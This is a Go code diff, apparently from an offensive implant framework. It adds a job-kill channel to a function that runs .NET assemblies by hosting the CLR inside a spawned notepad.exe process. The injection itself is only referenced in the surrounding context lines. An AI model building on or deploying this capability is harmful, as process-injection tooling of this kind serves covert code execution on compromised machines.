@@ -24,7 +24,24 @@ const (
 
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
 // along with a provided .NET assembly to execute.
-func executeassembly(assembly *[]byte, params *string) (AssemblyOutput, error) {
+func executeassembly(assembly *[]byte, params *string, jobKillChan <-chan int) (AssemblyOutput, error) {
+	kill := new(int)
+	*kill = 0
+	go func(jobChan <-chan int) {
+		log.Println(fmt.Sprintf("From Exe Asm, job kill chan: 0x%08d", jobChan))
+		for {
+			select {
+			case <-jobChan:
+				*kill = 1
+				log.Println("Got a kill signal! ", *kill)
+				return
+			default:
+				// …
+				// log.Println("Sleeping in the kill chan...")
+				time.Sleep(time.Second)
+			}
+		}
+	}(jobKillChan)
 	results := AssemblyOutput{}
 	log.Println("[*] Assembly size:", len(*assembly))
 	log.Println("[*] Hosting dll size:", len(loaderAssembly))
@@ -89,6 +106,11 @@ func executeassembly(assembly *[]byte, params *string) (AssemblyOutput, error) {
 	}
 	log.Printf("Got thread handle: 0x%08x\n", threadHandle)
 	for {
+		if *kill > 0 {
+			log.Println("From main EXE loop we see kill message")
+			// Init kill sequence
+			break
+		}
 		code, err := winapi.GetExitCodeThread(threadHandle)
 		log.Println(code)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
@@ -101,6 +123,9 @@ func executeassembly(assembly *[]byte, params *string) (AssemblyOutput, error) {
 		}
 	}
 	cmd.Process.Kill()
+	// if *kill > 0 {
+	// 	return results, errors.New("Job killed.")
+	// }
 	go func() {
 		_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
 	}()
